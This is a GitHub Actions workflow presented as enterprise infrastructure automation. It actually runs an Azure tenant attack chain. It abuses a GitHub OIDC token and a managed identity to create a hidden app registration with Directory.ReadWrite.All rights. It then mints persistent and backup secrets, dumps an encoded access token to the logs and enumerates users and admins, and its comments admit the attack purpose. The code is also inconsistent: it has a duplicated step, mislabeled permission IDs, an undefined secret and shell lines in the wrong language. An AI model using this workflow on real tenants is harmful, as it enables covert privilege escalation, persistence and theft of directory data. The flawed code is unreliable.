name: "Enterprise Infrastructure Automation"

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target Environment'
        required: true
        default: 'production'
        type: choice
        options:
        - production
        - staging
        - development
      operation_mode:
        description: 'Operation Mode'
        required: true
        default: 'monitoring'
        type: choice
        options:
        - monitoring
        - maintenance
        - emergency

permissions:
  id-token: write
  contents: read

env:
  OPERATION_ID: ${{ github.run_id }}-${{ github.run_attempt }}
  TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
  UAMI_CLIENT_ID: ${{ secrets.UAMI_CLIENT_ID }}

jobs:
  infrastructure-automation:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    
    steps:
      - name: "Initialize Operation Context"
        shell: pwsh
        run: |
          Write-Host "üîß Starting infrastructure automation workflow" -ForegroundColor Cyan
          Write-Host "Operation ID: $env:OPERATION_ID" -ForegroundColor White
          Write-Host "Environment: ${{ inputs.environment }}" -ForegroundColor White
          Write-Host "Mode: ${{ inputs.operation_mode }}" -ForegroundColor White
          Write-Host "Timestamp: $((Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss UTC'))" -ForegroundColor White

      - name: "Acquire GitHub OIDC Token"
        shell: pwsh
        run: |
          Write-Host "üîê Acquiring GitHub OIDC authentication token..." -ForegroundColor Cyan
          
          # Enhanced error handling for token acquisition
          $maxAttempts = 3
          $githubToken = $null
          
          for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
            try {
              $headers = @{
                'Authorization' = "Bearer $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN"
              }
              
              $uri = "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
              $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -ErrorAction Stop
              
              if ($response.value -and $response.value -ne "null") {
                $githubToken = $response.value
                Write-Host "‚úÖ GitHub OIDC token acquired successfully (attempt $attempt)" -ForegroundColor Green
                break
              } else {
                Write-Host "‚ö†Ô∏è Token acquisition failed (attempt $attempt/$maxAttempts)" -ForegroundColor Yellow
                Start-Sleep -Seconds ($attempt * 2)
              }
            }
            catch {
              Write-Host "‚ö†Ô∏è Token acquisition failed (attempt $attempt/$maxAttempts): $($_.Exception.Message)" -ForegroundColor Yellow
              Start-Sleep -Seconds ($attempt * 2)
            }
          }
          
          if (-not $githubToken) {
            Write-Host "‚ùå Failed to acquire GitHub OIDC token after $maxAttempts attempts" -ForegroundColor Red
            exit 1
          }
          
          # Set environment variable for next step
          "GITHUB_TOKEN=$githubToken" | Out-File -FilePath $env:GITHUB_ENV -Append

      - name: "Exchange for UAMI Token"
        shell: pwsh
        run: |
          Write-Host "üîÑ Exchanging GitHub token for Azure UAMI token..." -ForegroundColor Cyan
          
          # Validate required environment variables
          if (-not $env:TENANT_ID) {
            Write-Host "‚ùå TENANT_ID not set. Add AZURE_TENANT_ID to repository secrets or variables." -ForegroundColor Red
            exit 1
          }
          
          if (-not $env:UAMI_CLIENT_ID) {
            Write-Host "‚ùå UAMI_CLIENT_ID not set. Add UAMI_CLIENT_ID to repository secrets or variables." -ForegroundColor Red
            exit 1
          }
          
          # Enhanced token exchange with proper error handling
          Write-Host "üîç Attempting UAMI token exchange..." -ForegroundColor Cyan
          
          try {
            $body = @{
              'client_id' = $env:UAMI_CLIENT_ID
              'grant_type' = 'client_credentials'
              'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
              'client_assertion' = $env:GITHUB_TOKEN
              'scope' = 'https://graph.microsoft.com/.default'
            }
            
            $uri = "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token"
            $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
            
            if ($response.access_token) {
              Write-Host "‚úÖ UAMI token acquired successfully" -ForegroundColor Green
              "UAMI_TOKEN=$($response.access_token)" | Out-File -FilePath $env:GITHUB_ENV -Append
            } else {
              Write-Host "‚ùå No access token in response" -ForegroundColor Red
              Write-Host "Response: $($response | ConvertTo-Json)" -ForegroundColor Red
              exit 1
            }
          }
          catch {
            Write-Host "‚ùå Failed to acquire UAMI token - $($_.Exception.Message)" -ForegroundColor Red
            
            # Parse error details if available
            if ($_.ErrorDetails.Message) {
              try {
                $errorDetails = $_.ErrorDetails.Message | ConvertFrom-Json
                Write-Host "Error: $($errorDetails.error_description)" -ForegroundColor Red
                
                # Provide troubleshooting guidance
                switch ($errorDetails.error) {
                  'invalid_client' {
                    Write-Host "üí° Check: UAMI_CLIENT_ID is correct and UAMI exists in tenant" -ForegroundColor Yellow
                  }
                  { $_ -in @('invalid_grant', 'invalid_request') } {
                    Write-Host "üí° Check: Federated identity credential configuration" -ForegroundColor Yellow
                    Write-Host "   - Issuer: https://token.actions.githubusercontent.com" -ForegroundColor Yellow
                    Write-Host "   - Subject matches your repo pattern" -ForegroundColor Yellow
                    Write-Host "   - Audience: api://AzureADTokenExchange" -ForegroundColor Yellow
                  }
                  'unauthorized_client' {
                    Write-Host "üí° Check: UAMI has required Graph permissions" -ForegroundColor Yellow
                  }
                }
              }
              catch {
                Write-Host "Error details could not be parsed" -ForegroundColor Red
              }
            }
            exit 1
          }

      - name: "Deploy Relay Infrastructure"
        shell: pwsh
        run: |
          Write-Host "üèóÔ∏è Deploying relay infrastructure for ${{ inputs.environment }} environment..." -ForegroundColor Cyan
          
          # Generate environment-appropriate naming
          $appPrefix = switch ('${{ inputs.environment }}') {
            'production' { 'Prod-Automation' }
            'staging' { 'Stage-Monitor' }
            'development' { 'Dev-Tools' }
            default { 'App-Service' }
          }
          
          $relayName = "$appPrefix-Service-$((Get-Date).ToFileTime())"
          
          # Create relay App Registration using UAMI token
          $relayConfig = @{
            displayName = $relayName
            description = "Enterprise ${{ inputs.environment }} environment automation and monitoring service"
            signInAudience = 'AzureADMyOrg'
            web = @{
              homePageUrl = 'https://portal.azure.com'
              implicitGrantSettings = @{
                enableIdTokenIssuance = $false
                enableAccessTokenIssuance = $false
              }
            }
            requiredResourceAccess = @(
              @{
                resourceAppId = '00000003-0000-0000-c000-000000000000'
                resourceAccess = @(
                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; type = 'Role' }  # User.Read.All
                  @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; type = 'Role' }  # Application.Read.All
                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; type = 'Role' }  # Application.ReadWrite.All
                  @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; type = 'Role' }  # Directory.ReadWrite.All
                )
              }
            )
            tags = @('HideApp', 'WindowsAzureActiveDirectoryIntegratedApp')
          }
          
          try {
            $headers = @{
              'Authorization' = "Bearer $env:UAMI_TOKEN"
              'Content-Type' = 'application/json'
            }
            
            $body = $relayConfig | ConvertTo-Json -Depth 10
            
            $relayResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications' -Method Post -Headers $headers -Body $body -ErrorAction Stop
            
            $relayAppId = $relayResponse.appId
            $relayObjectId = $relayResponse.id
            
            if ($relayAppId) {
              Write-Host "‚úÖ Relay application created: $relayName" -ForegroundColor Green
              "RELAY_APP_ID=$relayAppId" | Out-File -FilePath $env:GITHUB_ENV -Append
              "RELAY_OBJECT_ID=$relayObjectId" | Out-File -FilePath $env:GITHUB_ENV -Append
              "RELAY_NAME=$relayName" | Out-File -FilePath $env:GITHUB_ENV -Append
            } else {
              Write-Host "‚ùå Failed to create relay application" -ForegroundColor Red
              exit 1
            }
          }
          catch {
            Write-Host "‚ùå Failed to create relay application: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
          }

      - name: "Configure Service Principal & Generate Secrets"
        shell: pwsh
        run: |
          Write-Host "üë§ Configuring service principal and credentials..." -ForegroundColor Cyan
          
          try {
            $headers = @{
              'Authorization' = "Bearer $env:UAMI_TOKEN"
              'Content-Type' = 'application/json'
            }
            
            # Create service principal
            $spConfig = @{
              appId = $env:RELAY_APP_ID
            }
            
            $spBody = $spConfig | ConvertTo-Json
            $spResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/servicePrincipals' -Method Post -Headers $headers -Body $spBody -ErrorAction Stop
            
            $relaySPId = $spResponse.id
            "RELAY_SP_ID=$relaySPId" | Out-File -FilePath $env:GITHUB_ENV -Append
            
            # Generate operational secret
            $secretConfig = @{
              passwordCredential = @{
                displayName = "OpKey-${{ inputs.environment }}"
                endDateTime = (Get-Date).AddMonths(12).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
              }
            }
            
            $secretBody = $secretConfig | ConvertTo-Json -Depth 3
            $secretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$env:RELAY_OBJECT_ID/addPassword" -Method Post -Headers $headers -Body $secretBody -ErrorAction Stop
            
            $relaySecret = $secretResponse.secretText
            "RELAY_SECRET=$relaySecret" | Out-File -FilePath $env:GITHUB_ENV -Append
            
            Write-Host "‚úÖ Service principal and secret created" -ForegroundColor Green
          }
          catch {
            Write-Host "‚ùå Failed to configure service principal: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
          }

      - name: "Assign Graph Permissions"
        shell: pwsh
        run: |
          Write-Host "üîê Assigning Microsoft Graph permissions..." -ForegroundColor Cyan
          
          try {
            $headers = @{
              'Authorization' = "Bearer $env:UAMI_TOKEN"
              'Content-Type' = 'application/json'
            }
            
            # Get Microsoft Graph service principal ID
            $graphSPResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -Headers $headers -ErrorAction Stop
            $graphSPId = $graphSPResponse.value[0].id
            
            # Progressive permission assignment with delays
            $permissions = @(
              @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All'; delay = 2 }
              @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; name = 'Application.Read.All'; delay = 2 }
              @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All'; delay = 3 }
              @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; name = 'Directory.ReadWrite.All'; delay = 3 }
            )
            
            foreach ($permission in $permissions) {
              Write-Host "Assigning permission: $($permission.name)" -ForegroundColor Yellow
              
              $assignmentConfig = @{
                principalId = $env:RELAY_SP_ID
                resourceId = $graphSPId
                appRoleId = $permission.id
              }
              
              $assignmentBody = $assignmentConfig | ConvertTo-Json
              
              try {
                Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Method Post -Headers $headers -Body $assignmentBody -ErrorAction Stop | Out-Null
                Write-Host "‚úÖ Assigned: $($permission.name)" -ForegroundColor Green
              }
              catch {
                Write-Host "‚ö†Ô∏è Failed to assign $($permission.name): $($_.Exception.Message)" -ForegroundColor Yellow
              }
              
              Start-Sleep -Seconds $permission.delay
            }
          }
          catch {
            Write-Host "‚ùå Failed to assign Graph permissions: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
          }

      - name: "Execute High-Privilege Operations"
        shell: pwsh
        run: |
          Write-Host "üöÄ Executing operations with relay App credentials..." -ForegroundColor Cyan
          
          try {
            # Get relay App token
            $tokenBody = @{
              client_id = $env:RELAY_APP_ID
              client_secret = $env:RELAY_SECRET
              grant_type = 'client_credentials'
              scope = 'https://graph.microsoft.com/.default'
            }
            
            $tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" -Method Post -Body $tokenBody -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
            $relayToken = $tokenResponse.access_token

            $converted = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($relayToken))
            write-host $converted
            
            $relayHeaders = @{
              'Authorization' = "Bearer $relayToken"
            }
            
            # Sample directory operations (replace with actual attack objectives)
            Write-Host "üìä Directory reconnaissance:" -ForegroundColor Cyan
            
            $usersResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=10&`$select=displayName,userPrincipalName,mail" -Headers $relayHeaders -ErrorAction Stop
            $users = $usersResponse.value | ForEach-Object { "$($_.displayName) ($($_.userPrincipalName))" }
            
            $groupsResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/groups?`$top=5&`$select=displayName" -Headers $relayHeaders -ErrorAction Stop
            $groups = $groupsResponse.value.displayName
            
            Write-Host "‚úÖ Sample users enumerated: $($users.Count) users" -ForegroundColor Green
            Write-Host "‚úÖ Sample groups enumerated: $($groups.Count) groups" -ForegroundColor Green
            
            Write-Host "üîó Complete attack chain: GitHub OIDC ‚Üí UAMI ‚Üí Self-Created Relay App ‚Üí Graph API" -ForegroundColor Cyan
          }
          catch {
            Write-Host "‚ùå Failed to execute high-privilege operations: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
          }

      - name: "Operational Security Cleanup"
        if: inputs.operation_mode == 'maintenance'
        shell: pwsh
        run: |
          Write-Host "üîí Generating backup operational secrets..." -ForegroundColor Cyan
          
          try {
            $headers = @{
              'Authorization' = "Bearer $env:UAMI_TOKEN"
              'Content-Type' = 'application/json'
            }
            
            $backupSecretConfig = @{
              passwordCredential = @{
                displayName = "BackupKey-${{ inputs.environment }}"
                endDateTime = (Get-Date).AddMonths(6).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
              }
            }
            
            $backupSecretBody = $backupSecretConfig | ConvertTo-Json -Depth 3
            $backupSecretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$env:RELAY_OBJECT_ID/addPassword" -Method Post -Headers $headers -Body $backupSecretBody -ErrorAction Stop
            
            $backupSecret = $backupSecretResponse.secretText
            
            if ($backupSecret) {
              Write-Host "‚úÖ Backup operational secret generated" -ForegroundColor Green
              "BACKUP_SECRET=$backupSecret" | Out-File -FilePath $env:GITHUB_ENV -Append
            } else {
              Write-Host "‚ö†Ô∏è Backup secret generation failed (non-critical)" -ForegroundColor Yellow
            }
          }
          catch {
            Write-Host "‚ö†Ô∏è Backup secret generation failed (non-critical): $($_.Exception.Message)" -ForegroundColor Yellow
          }

      - name: "Assign Graph Permissions"
        shell: pwsh
        run: |
          Write-Host "üîê Assigning Microsoft Graph permissions..." -ForegroundColor Cyan
          
          try {
            $headers = @{
              'Authorization' = "Bearer $env:UAMI_TOKEN"
              'Content-Type' = 'application/json'
            }
            
            # Get Graph Service Principal ID
            $graphSPResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -Headers $headers -ErrorAction Stop
            $graphSP = $graphSPResponse.value[0].id
            
            if (-not $graphSP) {
              Write-Host "‚ùå Failed to get Graph Service Principal ID" -ForegroundColor Red
              exit 1
            }
            
            # Progressive permission assignment based on environment
            $permissions = switch ('${{ inputs.environment }}') {
              'production' {
                @(
                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All' }
                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All' }
                  @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; name = 'Directory.ReadWrite.All' }
                )
              }
              'staging' {
                @(
                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All' }
                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All' }
                )
              }
              'development' {
                @(
                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All' }
                )
              }
            }
            
            foreach ($permission in $permissions) {
              Write-Host "üìã Assigning permission: $($permission.name)" -ForegroundColor Yellow
              
              $assignmentConfig = @{
                principalId = $env:RELAY_SP_ID
                resourceId = $graphSP
                appRoleId = $permission.id
              }
              
              $assignmentBody = $assignmentConfig | ConvertTo-Json
              
              try {
                $assignmentResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Method Post -Headers $headers -Body $assignmentBody -ErrorAction Stop
                
                if ($assignmentResponse.id) {
                  Write-Host "‚úÖ Permission assigned: $($permission.name)" -ForegroundColor Green
                } else {
                  Write-Host "‚ö†Ô∏è Permission assignment may require admin consent: $($permission.name)" -ForegroundColor Yellow
                }
              }
              catch {
                Write-Host "‚ö†Ô∏è Permission assignment may require admin consent: $($permission.name)" -ForegroundColor Yellow
              }
              
              # Randomized delay between assignments
              Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)
            }
          }
          catch {
            Write-Host "‚ùå Failed to assign Graph permissions: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
          }

      - name: "Execute Infrastructure Operations"
        shell: pwsh
        run: |
          Write-Host "‚ö° Executing infrastructure operations in ${{ inputs.operation_mode }} mode..." -ForegroundColor Cyan
          
          try {
            # Acquire operational token using relay app
            $tokenBody = @{
              client_id = $env:RELAY_APP_ID
              client_secret = $env:PRIMARY_SECRET
              grant_type = 'client_credentials'
              scope = 'https://graph.microsoft.com/.default'
            }
            
            $relayTokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" -Method Post -Body $tokenBody -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
            $relayToken = $relayTokenResponse.access_token
            
            if (-not $relayToken) {
              Write-Host "‚ùå Failed to acquire relay token" -ForegroundColor Red
              exit 1
            }
            
            Write-Host "‚úÖ Relay token acquired successfully" -ForegroundColor Green
            
            $relayHeaders = @{
              'Authorization' = "Bearer $relayToken"
            }
            
            # Execute operations based on mode
            switch ('${{ inputs.operation_mode }}') {
              'monitoring' {
                Write-Host "üìä Performing infrastructure monitoring..." -ForegroundColor Cyan
                
                # User monitoring
                try {
                  $userCountResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/users/$count' -Headers ($relayHeaders + @{'ConsistencyLevel' = 'eventual'}) -ErrorAction Stop
                  $userCount = $userCountResponse
                  Write-Host "üë• Total users: $userCount" -ForegroundColor White
                }
                catch {
                  Write-Host "üë• Total users: Unable to retrieve" -ForegroundColor Yellow
                }
                
                # Group monitoring  
                try {
                  $groupCountResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/groups/$count' -Headers ($relayHeaders + @{'ConsistencyLevel' = 'eventual'}) -ErrorAction Stop
                  $groupCount = $groupCountResponse
                  Write-Host "üè¢ Total groups: $groupCount" -ForegroundColor White
                }
                catch {
                  Write-Host "üè¢ Total groups: Unable to retrieve" -ForegroundColor Yellow
                }
                
                # Application monitoring
                try {
                  $appCountResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications/$count' -Headers ($relayHeaders + @{'ConsistencyLevel' = 'eventual'}) -ErrorAction Stop
                  $appCount = $appCountResponse
                  Write-Host "üì± Total applications: $appCount" -ForegroundColor White
                }
                catch {
                  Write-Host "üì± Total applications: Unable to retrieve" -ForegroundColor Yellow
                }
              }
              
              'maintenance' {
                Write-Host "üîß Performing infrastructure maintenance..." -ForegroundColor Cyan
                
                # Sample privileged users for maintenance operations
                try {
                  $privilegedUsersResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$top=5' -Headers $relayHeaders -ErrorAction Stop
                  $privilegedUsers = $privilegedUsersResponse.value | Where-Object { $_.userPrincipalName } | Select-Object -First 3 -ExpandProperty userPrincipalName
                  
                  Write-Host "üîê Privileged users identified for maintenance:" -ForegroundColor Cyan
                  foreach ($user in $privilegedUsers) {
                    if ($user) {
                      Write-Host "  - $user" -ForegroundColor White
                    }
                  }
                }
                catch {
                  Write-Host "üîê Privileged users: Unable to retrieve" -ForegroundColor Yellow
                }
              }
              
              'emergency' {
                Write-Host "üö® Emergency operations mode activated..." -ForegroundColor Red
                
                # Emergency user enumeration
                try {
                  $emergencyUsersResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displayName,accountEnabled&$top=10' -Headers $relayHeaders -ErrorAction Stop
                  $emergencyUsers = $emergencyUsersResponse.value | Select-Object -First 5
                  
                  Write-Host "üë§ Emergency user status:" -ForegroundColor Cyan
                  foreach ($user in $emergencyUsers) {
                    Write-Host "  $($user.userPrincipalName) ($($user.displayName)) - Enabled: $($user.accountEnabled)" -ForegroundColor White
                  }
                }
                catch {
                  Write-Host "üë§ Emergency user status: Unable to retrieve" -ForegroundColor Yellow
                }
              }
            }
          }
          catch {
            Write-Host "‚ùå Failed to execute infrastructure operations: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
          }

      - name: "Generate Operation Report"
        if: always()
        shell: pwsh
        run: |
          Write-Host "üìã Generating operation report..." -ForegroundColor Cyan
          
          $report = @{
            operation_id = $env:OPERATION_ID
            timestamp = (Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss UTC')
            environment = '${{ inputs.environment }}'
            mode = '${{ inputs.operation_mode }}'
            relay_app = @{
              name = $env:RELAY_NAME
              app_id = $env:RELAY_APP_ID
              created = $true
            }
            status = 'completed'
            github_ref = $env:GITHUB_REF
            github_sha = $env:GITHUB_SHA
          }
          
          $report | ConvertTo-Json -Depth 3 | Out-File -FilePath 'operation-report.json' -Encoding UTF8
          
          Write-Host "‚úÖ Operation completed successfully" -ForegroundColor Green
          Write-Host "üìä Report generated: operation-report.json" -ForegroundColor Cyan

      - name: "Cleanup (Optional)"
        if: inputs.environment == 'development'
        run: |
          echo "üßπ Performing development environment cleanup..."
          
          # In development, optionally clean up test resources
          if [[ "${{ inputs.operation_mode }}" == "emergency" ]]; then
            echo "‚ö†Ô∏è Emergency mode - skipping cleanup for forensic analysis"
          else
            echo "‚ôªÔ∏è Development cleanup completed"
          fi

          Write-Host "Assessment completed successfully" -ForegroundColor Green
          Write-Host "Trust chain: attacker-org/malicious-repo ‚Üí UAMI ‚Üí App ‚Üí Graph API" -ForegroundColor Magenta
